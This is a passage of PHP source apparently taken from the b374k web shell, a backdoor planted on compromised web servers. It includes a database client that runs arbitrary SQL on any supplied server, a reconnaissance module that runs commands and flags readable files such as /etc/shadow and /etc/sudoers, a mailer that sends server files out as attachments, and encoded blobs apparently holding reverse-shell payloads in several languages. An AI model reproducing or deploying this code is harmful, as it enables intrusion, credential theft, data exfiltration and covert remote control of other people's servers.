"; if(!function_exists('sql_connect')){ function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){ if($sqltype == 'mysql'){ if(class_exists('mysqli')) return new mysqli($sqlhost, $sqluser, $sqlpass); elseif(function_exists('mysql_connect')) return @mysql_connect($sqlhost, $sqluser, $sqlpass); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_connect')){ $coninfo = array("UID"=>$sqluser, "PWD"=>$sqlpass); return @sqlsrv_connect($sqlhost,$coninfo); } elseif(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass); } elseif($sqltype == 'pgsql'){ $hosts = explode(":", $sqlhost); if(count($hosts)==2){ $host_str = "host=".$hosts[0]." port=".$hosts[1]; } else $host_str = "host=".$sqlhost; if(function_exists('pg_connect')) return @pg_connect("$host_str user=$sqluser password=$sqlpass"); } elseif($sqltype == 'oracle'){ if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); } elseif($sqltype == 'sqlite3'){ if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost); else return false; } elseif($sqltype == 'sqlite'){ if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); } elseif($sqltype == 'odbc'){ if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass); } elseif($sqltype == 'pdo'){ if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass); else return false; } return false; }
} if(!function_exists('sql_query')){ function sql_query($sqltype, $query, $con){ if($sqltype == 'mysql'){ if(class_exists('mysqli')) return $con->query($query); elseif(function_exists('mysql_query')) return mysql_query($query); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query); elseif(function_exists('mssql_query')) return mssql_query($query); } elseif($sqltype == 'pgsql') return pg_query($query); elseif($sqltype == 'oracle') return oci_execute(oci_parse($con, $query)); elseif($sqltype == 'sqlite3') return $con->query($query); elseif($sqltype == 'sqlite') return sqlite_query($con, $query); elseif($sqltype == 'odbc') return odbc_exec($con, $query); elseif($sqltype == 'pdo') return $con->query($query); }
} if(!function_exists('sql_num_rows')){ function sql_num_rows($sqltype,$result){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) return $result->mysqli_num_rows; elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result); elseif(function_exists('mssql_num_rows')) return mssql_num_rows($result); } elseif($sqltype == 'pgsql') return pg_num_rows($result); elseif($sqltype == 'oracle') return oci_num_rows($result); elseif($sqltype == 'sqlite3'){ $metadata = $result->fetchArray(); if(is_array($metadata)) return $metadata['count']; } elseif($sqltype == 'sqlite') return sqlite_num_rows($result); elseif($sqltype == 'odbc') return odbc_num_rows($result); elseif($sqltype == 'pdo') return $result->rowCount(); }
} if(!function_exists('sql_num_fields')){ function sql_num_fields($sqltype, $result){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) return $result->field_count; elseif(function_exists('mysql_num_fields')) return mysql_num_fields($result); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result); elseif(function_exists('mssql_num_fields')) return mssql_num_fields($result); } elseif($sqltype == 'pgsql') return pg_num_fields($result); elseif($sqltype == 'oracle') return oci_num_fields($result); elseif($sqltype == 'sqlite3') return $result->numColumns(); elseif($sqltype == 'sqlite') return sqlite_num_fields($result); elseif($sqltype == 'odbc') return odbc_num_fields($result); elseif($sqltype == 'pdo') return $result->columnCount(); }
} if(!function_exists('sql_field_name')){ function sql_field_name($sqltype,$result,$i){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) { $z=$result->fetch_field();return $z->name;} elseif(function_exists('mysql_field_name')) return mysql_field_name($result,$i); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_field_metadata')){ $metadata = sqlsrv_field_metadata($result); if(is_array($metadata)){ $metadata=$metadata[$i]; } if(is_array($metadata)) return $metadata['Name']; } elseif(function_exists('mssql_field_name')) return mssql_field_name($result,$i); } elseif($sqltype == 'pgsql') return pg_field_name($result,$i); elseif($sqltype == 'oracle') return oci_field_name($result,$i+1); elseif($sqltype == 'sqlite3') return $result->columnName($i); elseif($sqltype == 'sqlite') return sqlite_field_name($result,$i); elseif($sqltype == 'odbc') return odbc_field_name($result,$i+1); elseif($sqltype == 'pdo'){ $res = $result->getColumnMeta($i); return $res['name']; } }
} if(!function_exists('sql_fetch_data')){ function sql_fetch_data($sqltype,$result){ if($sqltype == 'mysql'){ if(class_exists('mysqli_result')) return $result->fetch_row(); elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1); elseif(function_exists('mssql_fetch_row')) return mssql_fetch_row($result); } elseif($sqltype == 'pgsql') return pg_fetch_row($result); elseif($sqltype == 'oracle') return oci_fetch_row($result); elseif($sqltype == 'sqlite3') return $result->fetchArray(1); elseif($sqltype == 'sqlite') return sqlite_fetch_array($result,1); elseif($sqltype == 'odbc') return odbc_fetch_array($result); elseif($sqltype == 'pdo') return $result->fetch(2); }
} if(!function_exists('sql_close')){ function sql_close($sqltype,$con){ if($sqltype == 'mysql'){ if(class_exists('mysqli')) return $con->close(); elseif(function_exists('mysql_close')) return mysql_close($con); } elseif($sqltype == 'mssql'){ if(function_exists('sqlsrv_close')) return sqlsrv_close($con); elseif(function_exists('mssql_close')) return mssql_close($con); } elseif($sqltype == 'pgsql') return pg_close($con); elseif($sqltype == 'oracle') return oci_close($con); elseif($sqltype == 'sqlite3') return $con->close(); elseif($sqltype == 'sqlite') return sqlite_close($con); elseif($sqltype == 'odbc') return odbc_close($con); elseif($sqltype == 'pdo') return $con = null; }
} if(!function_exists('sql_get_supported')){ function sql_get_supported(){ $db_supported = array(); if(function_exists("mysql_connect")) $db_supported[] = 'mysql'; if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $db_supported[] = 'mssql'; if(function_exists("pg_connect")) $db_supported[] = 'pgsql'; if(function_exists("oci_connect")) $db_supported[] = 'oracle'; if(function_exists("sqlite_open")) $db_supported[] = 'sqlite'; if(class_exists("SQLite3")) $db_supported[] = 'sqlite3'; if(function_exists("odbc_connect")) $db_supported[] = 'odbc'; if(class_exists("PDO")) $db_supported[] = 'pdo'; return implode(",", $db_supported); }
} if(isset($p['dbGetSupported'])){ $res = sql_get_supported(); if(empty($res)) $res = "error"; output($res);
}
elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['dbPass'])&&isset($p['dbPort'])){ $type = $p['dbType']; $host = $p['dbHost']; $user = $p['dbUser']; $pass = $p['dbPass']; $port = $p['dbPort']; $con = sql_connect($type ,$host , $user , $pass); $res = ""; if($con!==false){ if(isset($p['dbQuery'])){ $query = $p['dbQuery']; $pagination = ""; if((isset($p['dbDB']))&&(isset($p['dbTable']))){ $db = trim($p['dbDB']); $table = trim($p['dbTable']); $start = (int) (isset($p['dbStart']))? trim($p['dbStart']):0; $limit = (int) (isset($p['dbLimit']))? trim($p['dbLimit']):100; if($type=='mysql'){ $query = "SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$limit.";"; } elseif($type=='mssql'){ $query = "SELECT TOP ".$limit." * FROM ".$db."..".$table.";"; } elseif($type=='pgsql'){ $query = "SELECT * FROM ".$db.".".$table." LIMIT ".$limit." OFFSET ".$start.";"; } elseif($type=='oracle'){ $limit = $start + $limit; $query = "SELECT * FROM ".$db.".".$table." WHERE ROWNUM BETWEEN ".$start." AND ".$limit.";"; } elseif($type=='sqlite' || $type=='sqlite3'){ $query = "SELECT * FROM ".$table." LIMIT ".$start.",".$limit.";"; } else $query = ""; $pagination = "Limit <input type='text' id='dbLimit' value='".html_safe($limit)."' style='width:50px;'> <span class='button' onclick=\"db_pagination('prev');\">prev</span> <span class='button' onclick=\"db_pagination('next');\">next</span> <input type='hidden' id='dbDB' value='".html_safe($db)."'> <input type='hidden' id='dbTable' value='".html_safe($table)."'> <input type='hidden' id='dbStart' value='".html_safe($start)."'> "; } $querys = explode(";", $query); foreach($querys as $query){ if(trim($query) != ""){ $query_query = sql_query($type, $query, $con); if($query_query!=false){ $res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> ok <span class='strong'>]</span></p>"; if(!empty($pagination)){ $res .= "<p>".$pagination."</p>"; } if(!is_bool($query_query)){ $res .= "<table class='border dataView sortable tblResult'><tr>"; for($i = 0; $i < sql_num_fields($type, $query_query); $i++) $res .= "<th>".html_safe(sql_field_name($type, $query_query, $i))."</th>"; $res .= "</tr>"; while($rows = sql_fetch_data($type, $query_query)){ $res .= "<tr>"; foreach($rows as $r){ if(empty($r)) $r = " "; $res .= "<td>".html_safe($r)."</td>"; } $res .= "</tr>"; } $res .= "</table>"; } } else{ $res .= "<p>".html_safe($query).";&nbsp;&nbsp;&nbsp;<span class='strong'>[</span> error <span class='strong'>]</span></p>"; } } } } else{ if(($type!='pdo') && ($type!='odbc')){ if($type=='mysql') $showdb = "SHOW DATABASES"; elseif($type=='mssql') $showdb = "SELECT name FROM master..sysdatabases"; elseif($type=='pgsql') $showdb = "SELECT schema_name FROM information_schema.schemata"; elseif($type=='oracle') $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME"; elseif(($type=='sqlite3') || ($type=='sqlite')) $showdb = "SELECT \"".$host."\""; else $showdb = "SHOW DATABASES"; $query_db = sql_query($type, $showdb, $con); if($query_db!=false) { while($db_arr = sql_fetch_data($type, $query_db)){ foreach($db_arr as $db){ if($type=='mysql') $showtbl = "SHOW TABLES FROM ".$db; elseif($type=='mssql') $showtbl = "SELECT name FROM ".$db."..sysobjects WHERE xtype = 'U'"; elseif($type=='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$db."'"; elseif($type=='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$db."'"; elseif(($type=='sqlite3') || ($type=='sqlite')) $showtbl = "SELECT name FROM sqlite_master WHERE type='table'"; else $showtbl = ""; $res .= "<p class='boxtitle boxNav' style='padding:8px 32px;margin-bottom:4px;'>".$db."</p><table class='border' style='display:none;margin:8px 0;'>"; $query_table = sql_query($type, $showtbl, $con); if($query_table!=false){ while($tables_arr = sql_fetch_data($type, $query_table)){ foreach($tables_arr as $table) $res .= "<tr><td class='dbTable borderbottom' style='cursor:pointer;'>".$table."</td></tr>"; } } $res .= "</table>"; } } } } } } if(!empty($res)) output($res); output('error');
} $GLOBALS['module']['info']['id'] = "info";
$GLOBALS['module']['info']['title'] = "Info";
$GLOBALS['module']['info']['js_ontabselected'] = "";
$GLOBALS['module']['info']['content'] = "<div class='border infoResult'></div>"; if(!function_exists('info_getinfo')){ function info_getinfo(){ $res = ""; $res .= "<p class='boxtitle' onclick=\"info_toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>"; $res .= "<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>"; if(is_win()){ foreach (range("A", "Z") as $letter){ if(is_readable($letter.":\\")){ $drive = $letter.":"; $res .= "<tr><td>drive ".$drive."</td><td>".format_bit(@disk_free_space($drive))." free of ".format_bit(@disk_total_space($drive))."</td></tr>"; } } } else $res .= "<tr><td>root partition</td><td>".format_bit(@disk_free_space("/"))." free of ".format_bit(@disk_total_space("/"))."</td></tr>"; $res .= "<tr><td>php</td><td>".phpversion()."</td></tr>"; $access = array("python"=>"python -V", "perl"=>"perl -e \"print \$]\"", "python"=>"python -V", "ruby"=>"ruby -v", "node"=>"node -v", "nodejs"=>"nodejs -v", "gcc"=>"gcc -dumpversion", "java"=>"java -version", "javac"=>"javac -version" ); foreach($access as $k=>$v){ $version = execute($v); $version = explode("\n", $version); if($version[0]) $version = $version[0]; else $version = "?"; $res .= "<tr><td>".$k."</td><td>".$version."</td></tr>"; } if(!is_win()){ $interesting = array( "/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases", "/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf", "/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf", "/etc/ssh/sshd_config", "/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf", "/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf", "/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules"); foreach($interesting as $f){ if(@is_file($f) && @is_readable($f)) $res .= "<tr><td>".$f."</td><td><a data-path='".html_safe($f)."' onclick='view_entry(this);'>".$f." is readable</a></td></tr>"; } } $res .= "</table></div>"; if(!is_win()){ if($i_buff=trim(read_file("/proc/cpuinfo"))){ $res .= "<p class='boxtitle' onclick=\"info_toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>"; $res .= "<div class='info' id='info_cpu' style='margin-bottom:8px;display:none;'>"; $i_buffs = explode("\n\n", $i_buff); foreach($i_buffs as $i_buffss){ $i_buffss = trim($i_buffss); if($i_buffss!=""){ $i_buffsss = explode("\n", $i_buffss); $res .= "<table class='dataView'>"; foreach($i_buffsss as $i){ $i = trim($i); if($i!=""){ $ii = explode(":",$i); if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>"; } } $res .= "</table>"; } } $res .= "</div>"; } if($i_buff=trim(read_file("/proc/meminfo"))){ $res .= "<p class='boxtitle' onclick=\"info_toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>"; $i_buffs = explode("\n", $i_buff); $res .= "<div class='info' id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>"; foreach($i_buffs as $i){ $i = trim($i); if($i!=""){ $ii = explode(":",$i); if(count($ii)==2) $res .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>"; } else $res .= "</table><table class='dataView'>"; } $res .= "</table></div>"; } if($i_buff=trim(read_file("/proc/partitions"))){ $i_buff = preg_replace("/\ +/", " ", $i_buff); $res .= "<p class='boxtitle' onclick=\"info_toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>"; $res .= "<div class='info' id='info_part' style='margin-bottom:8px;display:none;'>"; $i_buffs = explode("\n\n", $i_buff); $res .= "<table class='dataView'><tr>"; $i_head = explode(" ", $i_buffs[0]); foreach($i_head as $h) $res .= "<th>".$h."</th>"; $res .= "</tr>"; $i_buffss = explode("\n", $i_buffs[1]); foreach($i_buffss as $i_b){ $i_row = explode(" ", trim($i_b)); $res .= "<tr>"; foreach($i_row as $r) $res .= "<td style='text-align:center;'>".$r."</td>"; $res .= "</tr>"; } $res .= "</table>"; $res .= "</div>"; } } $phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES); foreach($phpinfo as $p=>$i){ $res .= "<p class='boxtitle' onclick=\"info_toggle('".$i."');\" style='margin-bottom:8px;'>".$p."</p>"; ob_start(); eval("phpinfo(".$i.");"); $b = ob_get_contents(); ob_end_clean(); if(preg_match("/<body>(.*?)<\/body>/is", $b, $r)){ $body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]); $body = str_replace("<table", "<table class='boxtbl' ", $body); $body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body); $body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", "", $body); $body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", "", $body); $res .= "<div class='info' id='".$i."' style='margin-bottom:8px;display:none;'>".$body."</div>"; } } $res .= "<span class='button colSpan' onclick=\"info_refresh();\" style='margin-bottom:8px;'>refresh</span><div style='clear:both;'></div>"; return $res; }
} if(isset($p['infoRefresh'])){ output(info_getinfo());
} $GLOBALS['module']['mail']['id'] = "mail";
$GLOBALS['module']['mail']['title'] = "Mail";
$GLOBALS['module']['mail']['js_ontabselected'] = "if(!portableMode) $('#mailFrom').focus();";
$GLOBALS['module']['mail']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Mail</p></th></tr>
</thead>
<tbody id='mailTBody'> <tr><td style='width:120px'>From</td><td colspan='2'><input type='text' id='mailFrom' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr> <tr><td>To</td><td><input type='text' id='mailTo' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr> <tr><td>Subject</td><td><input type='text' id='mailSubject' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>
</tbody>
<tfoot> <tr><td colspan='2'><textarea id='mailContent' style='height:140px;min-height:140px;'></textarea></td></tr> <tr> <td colspan='2'><span style='width:120px;' class='button' onclick=\"mail_send();\">send</span> <span style='width:120px;' class='button' onclick=\"mail_attach();\">attachment</span> </td> </tr> <tr><td colspan='2'><span id='mailResult'></span></td></tr>
</tfoot>
</table>
"; if(!function_exists('send_email')){ function send_email($from, $to, $subject, $msg, $attachment){ $headers = "MIME-Version: 1.0\r\n".$from; $rand = md5(time()); $headers .= "Content-Type: multipart/mixed; boundary=\"".$rand."\"\r\n\r\n"; $headers .= "--".$rand."\r\n"; $headers .= "Content-Type: text/html; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: 8bit\r\n\r\n"; $headers .= $msg."\r\n\r\n"; if(count($attachment)>0){ foreach($attachment as $file){ if(is_file($file)){ $content = chunk_split(base64_encode(read_file($file))); $headers .= "--".$rand."\r\n"; $headers .= "Content-Type: application/octet-stream; name=\"".basename($file)."\"\r\n"; $headers .= "Content-Transfer-Encoding: base64\r\n"; $headers .= "Content-Disposition: attachment\r\n\r\n"; $headers .= $content."\r\n\r\n"; } } } $headers .= "--".$rand."--\r\n"; if(@mail($to, $subject, "", $headers)) return true; return false; }
} if(isset($p['mailFrom'])&&isset($p['mailTo'])&&isset($p['mailSubject'])&&isset($p['mailContent'])){ $mailFrom = trim($p['mailFrom']); $mailTo = trim($p['mailTo']); $mailSubject = trim($p['mailSubject']); $mailContent = trim($p['mailContent']); $mailAttachment = trim($p['mailAttachment']); $mailAttachment = (!empty($mailAttachment))? explode("{[|b374k|]}", $p['mailAttachment']):array(); if(empty($mailTo)) output("Please specify at least one recipient"); if(!empty($mailFrom)){ $mailFrom = "From: ".$mailFrom."\r\nReply-To: ".$mailFrom."\r\n"; } foreach($mailAttachment as $file){ $file = trim($file); if(empty($file)) continue; if(!is_file($file)) output("No such file : ".$file); } if(send_email($mailFrom, $mailTo, $mailSubject, $mailContent, $mailAttachment)) output("Mail sent to ".html_safe($mailTo)); output("Failed to send mail");
} $server_addr = isset($_SERVER['SERVER_ADDR'])? $_SERVER['SERVER_ADDR']:isset($_SERVER["HTTP_HOST"])?$_SERVER["HTTP_HOST"]:"";
$remote_addr = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']:"";
$default_port = 13123;
$winbinary = (strtolower(substr(php_uname(),0,3))=="win")? "<option>executable</option>":""; $GLOBALS['resources']['rs_php'] = "7VRNj9s2ED3bv0JRBSyFKrZlFwiwLjeX9lggaAv0kN0KMkWtCEsiy6FqB9397x1+yB8bZzdIg15aGJbIGc6b4czT+/6tatT0m6gxRsH1fH4vTDNsZkx2883qzXdb/5xyraUuNFdSG9Hfk0W6ngI3hREdL1rRCeNMclOITrWCCVPU7QANQeM0MaW+5wYo36tWVpzEUZwFI/oTBjRfrd7galfSfmhbXPHDChoaYyAmjn798eef6N5w3a3f/ZLTq9vk3W8/3Fytgxtt6/lG9HNootcixtiOxq7+CBrettF1xGTfc2Z4ddujfypqwuTQGzKWmFKap39NJ4miwbTGDVYQ27dBONFXuH6c8hb4pfDleTi8X9x5iIMhvxuxSrZ1WLaOeuiZEbIv+F6AAXKlWG/aopZ6e5V6TFHRo9F2doJxzkxf5ynGGZKfWL1lESxKgtgXODMQFUnPI3wFWFK4n0sHFIzmZVeAZFscNXD9J9ckNkwhTxYz97uOZ4nKEqRHL90LY2zCMTRQRA7YI8hWrpiEPUEuGePKHgilotfIVu4wGwwb3BHkaDH0ZcdJmi2yVYr1xzvRu0In9U4Lw0nCsqSbYYfZDi84i29iCzfZNaJFp3pFaV3izFyIHVBth4FR7pTrkOb3RVca1pB4zqrbiLz//Rbuvk3nAumKt9Q69dGTpKoobv0ofbSAohKaoCdNWTMuvTuR9LQuZ3y0j0Aio0V3eutEuRva+cTRw0P0Cf8fA/rTaIO93K5HuAiT8b29MeZCls8+ynzSL+kKtKXUrJXAx3aMOzcRdFvgp612B5MKaKl1+YEs6I1fxEooHmexjtMsf2rcoXF5wejBlKZKS1ZIxXtM3mQIj50XyrmxUa+wy5qDHDSzN8R5HFl/yrlNi8yyOmWD8QvMFs+fyF88sXz2BAtOTzajh0Az+11zWdu2Pjz4lU+XpsepJboMPbR9DeWEpJ5Ah5wtahfB8xkqJX5uZWY18kBg0RdHHF0eyCpojfGVMzMInBxHGRqUiPRIyzOssaBLgKPvI1T2AuDyGcDly4CP5xw9Ie+49Nc63+dP9qG9jnKjWXvGH/Tdi6IV6iCKtRUtT9DGqQLv8T9q25erF3yResF/Vr3gknp9Sq/gf706OwEv6RV8nl7BV9IruKwG8K/pFXxtvYLP0at/LFJvb/4G";
$GLOBALS['resources']['rs_python'] = "rVRtb9owEP6c/IrUnYYtUlNoq010QUJtOlVbWwRM+9B2KDgHiQpOZDst/fc7JykwxNQPmxBJ7sV399w958ODVqFVa5rKFshnL381SSbdQy8xJtfdVmuemqSYcpEtW9OTT6dP1dNNl3mmjKfA18U0V5kArf1M+/oV/5l4AuObdAluHhDiJvYRw8zTCSwWVLCu69gzweYsH2Q5SCr80iUYqwIjmzgrzB9O14PQqkGpfepU7mqZ6ygwhZKe1fIqIlcQxZQ131QYbUu1zA1lHKTIYqCNwsyOPjeYW5YfCZNmsqo/nXmZ5jJawkFApCGocmaB4LN0ATKjmNhBO7bDwJISWJXtGofDm2BlQC3PB6N20Pgw+HnZa5zXVlSdl4PQiXeUel8+kqY2is5Yk3i9baGzkTAPLDTY7C8JpvZs56zkGPVavh2FVSkQz7R93DllPIYSGSmREVunAysBuam880jrUldHdSxShEQV6x1XCmcaKOAaIiUSSkT84NH7Xw/6scmIr/zZIppr63D99fZuGF70RyGrjmGgaR2hbl8emYSnOk4VnfK5yoqcthl787ENFMmOsbbh4EDG9G/zqt02IDCYpVLJP8W2iiiMF8m4RIjfFmMd2kruOohX0+gqQqliw1vu7ppj5EGSJhY9ByNeLJ1Ij7jzAEnAIzV/dutOzlkQdOwKBPP79qMLiy39yUbvJPjuWDvmh1VqED7uUyoNzZmrg2rNePWitdS/mlzfhuN6B/no7uLbZDQehv0bPILAjDVk+dp/dPd9Yp22j0yG4Y9R2L+8HPqYcadozZGhMaXkmJc/4ue225ovUqS6pGcoWOrhKkcsQODCcsvuw4Zl9mbgegFgJ7oh8L6Vehs0JeW9U90gXtcTmZQgDMTY8r3TX4/+vQBkvfR746x33t2ZkgXpIUGrOJQmVSP2ojx7D6X+V5T6v6DU7Dc=";
$GLOBALS['resources']['rs_perl'] = "lZJhb9MwEIY/17/CZF6bSIG0DAmpJhVVmqFqa1PFHQhRiNL0WKylcRS7rKgrvx0ny2gEQoJ8sO5en56zHuXsmbOTpbPmuQP5N1xAmaEznCpVyKHj3HKV7tYvErF11hevX909nmgnAU+D4ZCJ5A4URURIl3wJdCFT14B9IUqFl344c/cKyi1dsIHbW5HFh8lq1KPNvQ5pvVem+Dk3KOJfzQr0Y+vc65Rbh5p27gUztvC9c+xcGfSIiHJvQRWlUGL9PY+3YPZUUvQsimT9GpPZ3cVlNJ37S7vLAu8qYsvQH89soqyHhw0H06pXvR2H79677sA6oA4pXFK1n/qfKepIUBVKFBWLBddRRdE0FkShf8P88WQS2gNN6ejXb/RMNR1vNmXEc5MU9nReTUTj+UfrtLGTcakg19MXrTBOEtBrPJtZ9WKN82yjloxlClmGhzgReQ6Jgs0qN+x+NScKyDFbTqZz23jT9Qz6FAQ3S9sYtRM/DJsEdWAPCdZOT+uTTEgwPYs+FuxXUbFbjea2Os20ahxXuE8ROiLI5Mnoyz+NkrTpBnXHXZ6DimIltK+0pYPE7m8uCW9dNya0QxK34lob+zdtZqNt1GWGRZ+Sxls7asRV0d/N/ZewWhMcKm2m/nuOSH8/AQ==";
$GLOBALS['resources']['rs_ruby'] = "tVb7b9M6FP7Z+SuMN0hzVxLGQ+h2N6vGU0ggqjG4QmQXtc5pYy11gu3QoW387fiVrqXt1ivd66p1es7n8/T52p07SSNFMmI8Af4di2b0I9jBhVK17CXJhKmiGcW0miajR08fn7nPQMC3hgnAoazoGajwWlAPVcGHUwiDIIcxlg09kwESoBrB8fHHZ5+/Dt4enbx6f/wuzqsZp0MJ8XSoaNEJp3LG+KV5TxmfzMKor0QDvfGwlBAAz51FAcPSOOlIJSJtOdV7gNgYv2IlxHDOpJJ9r9TagY8n5jCz0rg1EKvqqw7NGDbHbaRYFcCxSEU8kc2ok2RJ0iVZRiJsYT4N4aLRh46OX3+KS+ATVaTpfoD1MqIvD07Tn8k/Xx7c//P0Yr/75Go36dfpG65gAqLjEVFPB6vsGZmePB98APEdhI2TkG4dWQ1NZTykFGoHpHEtGFeY2DZgWUBZ4h6mFedAFeQZJxY3ggnj9sksHSivlO8FXljjlJoqsCUhnAPF0voZdwic15VQ+OTl8bv0XIGYHgw+7Kdhtjv4+0V2GB54vRYe2DskC3yf4eyv7N7dHGeHdnvodtIdm1c09wamsYuu2/TmPSYxifbIIVlCzQrdaVzq2CeglhMySwyZBAxCVOKZqEzypWlGziAT/d1kBe+rU8a0qKZ1mhKyAvEwY4fmOP4jYWshZpVp6e+ORiasG4aRM7zxRHt1cz0/VFXiR79TRhvRzse8QLcgXzChvWvLNwHNZd6k264jCw31ZcpmvRvLtC5pV6etE7oN/p+mBRtNvXkf11UNvFN2iSDRxSWrLlvzrDJsk+8RPZd7K76ugm3D/l22+L19FiBpc33vNfnN6QW4bMR1BjKmZbWQkUw5K4PWluvhErE9tAS5gdi0o1VqO9DSIrXf9k81x5oC+oAc4TrGsz8ejvF2Loory3pIbsFxyBEcQkvUhhAaa760jIaMu/+byFCb2Tzo1QullS1hSUdYWoJuISkbP1rDTMjLF6nIytBm4kHtoTU0g9rDi4zihUvk4US2d3bdmLCty29MsDmKdpBX3S5r/o1z8Mh10ym3nM4lp353m/8zsHbgkJ82E6WbM/1kJwz58XKTZ8FG8gs=";
$GLOBALS['resources']['rs_node'] = "nVHLbsIwEDwbiX+IcokjIVsqSJVAnPoJPdKHjLNgq46T2g5UQvx7/QgU6ENVcrCyO7Ozu7OUZsK51s4p3UonujXhTU3X0/vZW3rHox0zmW3ZXmfLzMB7Jw3gggupqtfWNBysLUoSCYtE1uAuqT4syh6yzgCrL9GUORN4o22j4KpVSkVKryJAKU8p6FpqakXhEbnB/TSkVcxtGlOTmjkuMH3Ze5Ysy686XlcEPqA4KzKz3XngpBDCpBn+iAK9dWK5nJaH8QgFvvBkvxfhfngHj2B2YPCm09zJRmMbeciSvZEOcB6N7LvPw4oauIPqSedhp6z/0mZeOHqJI/0St4JYV0lNDNiuBlzeQk3niO+eV8yxfHKaJsMhLg+naWK0OH5XBmMGlv9Vdhr6WzVKryBKWgc6Or26ew7J43gEykJ26//s7L+98v8hORqs71Um8aKraZT77yHQbxdAP1iPBnqOBpqNhrl8/AQ=";
$GLOBALS['resources']['rs_gcc'] = "rVJhb9owEP0Mv8JjU+tQj5C006TSVEKFSWgtRMA0TRuKgmPIqcGOYjNBp/732nFgwLRJk/ohyd27l3f2vXObKFUql9euuwSVructKlbu/PLj1aN9o6ZbfwucZuuEoRupEhCt9PYIKoAvT7Ekg/kJtpWu2uZM/glLQR+ZOsY5U6AfF/gxvuag1Q0GXKFVDBybIC6WlNA0LlBThz+/z5xf9ZopSEKJCLxOvaYPuqYa0M3iJCki4Ag0DAtsfg4C3/xSg5YEHi3iFWTboPspGgz7084ez0WhglQJLnGsBOCylzdznN8Uo92S5adkZngw7PZ646g7/FbSZGDviyt1MhndfY4m03G/+0DalsKU4YhcYanL95GhlMxo3P8y6Rs9ciaIhCcmFlhU/Rf4jXTYBhS2MnPgiRbAJzdHTecMSHvjWVamB8q45n0oUxrElLKyc3t/HK1DScMuhExZlqFrRAXnjCqW/OAN4l9V3GSd+5p7lHiHiW8lt7rpCjfYxowUTfvjh2CjWLHqhBMvOH8Xfu3dnneqqoZ0yChy9Y1cmaL30LBnzYRkmJr4uV5jmWRob+fl69tpFrKMLNGf2Sk/sULsEKJnnelp7ggX3sUhstP+5w4MwnA8mo6i6V248xVXw/6rm9UmnNQcx7lpH25E6aT8DyflceIdJq/vpLROPtdfAA==";
